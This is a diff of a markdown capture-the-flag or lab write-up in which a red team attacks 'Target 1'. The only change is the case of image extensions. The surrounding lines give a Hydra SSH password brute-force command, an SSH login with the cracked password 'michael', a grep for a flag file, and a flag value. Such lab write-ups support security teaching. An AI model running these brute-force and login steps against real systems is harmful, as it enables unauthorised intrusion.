@@ -49,13 +49,13 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
         - ![WPScan](/Images/WPScan.png)
       - Use Hydra to crack michael's password or guess password
         - hydra -l michael -P /usr/shar/wordlists/rockyou.txt 192.168.1.110 ssh
-        - ![Hydra](/Images/Hydra.png)
+        - ![Hydra](/Images/Hydra.PNG)
       - Use stolen credentials to SSH into michael's account
         - ssh michael@192.168.1.110
         - Password: michael
       - Search for Flag1
         - grep -rnw ./ -e 'flag1' 2>/dev/null
-        - ![flag1](/Images/Flag1.png)
+        - ![flag1](/Images/Flag1.PNG)
 
   - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a3e581c
     - **Exploit Used**
